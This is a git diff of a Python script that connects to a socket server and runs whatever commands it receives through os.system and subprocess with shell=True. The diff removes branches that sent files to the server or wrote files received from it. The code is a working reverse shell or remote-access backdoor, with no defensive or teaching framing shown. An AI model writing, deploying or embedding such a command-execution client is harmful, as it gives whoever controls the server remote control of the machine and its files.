@@ -1,7 +1,6 @@
 import socket
 import os
 import subprocess
-from defs import *
 
 host = '127.0.0.1'
 port = 8080
@@ -34,27 +33,7 @@ while True:
         elif comm[:5] == 'start':
             os.system(comm)
         elif comm[:4] == 'open':
-            os.system(comm)
-        elif comm[:3] == 'get':
-            try:
-                filename = comm.split()[1]
-                upload_file(client, filename)
-            except FileNotFoundError as e:
-                send_error(e)
-            except (IOError, OSError) as e:
-                send_error(e)
-            except Exception as e:
-                send_error(e)
-        elif comm[:2] == 'up':
-            try:
-                filename = comm.split()[1]
-                download_file(client, filename)
-            except FileNotFoundError as e:
-                send_error(e)
-            except (IOError, OSError) as e:
-                send_error(e)
-            except Exception as e:
-                send_error(e)
+            os.system(comm) 
         else:
             try:
                 output = subprocess.run(comm, text=True, shell=True, capture_output=True)
@@ -69,3 +48,6 @@ while True:
     except socket.error as e:
         send_error(e)
         
+client.close()
+
+
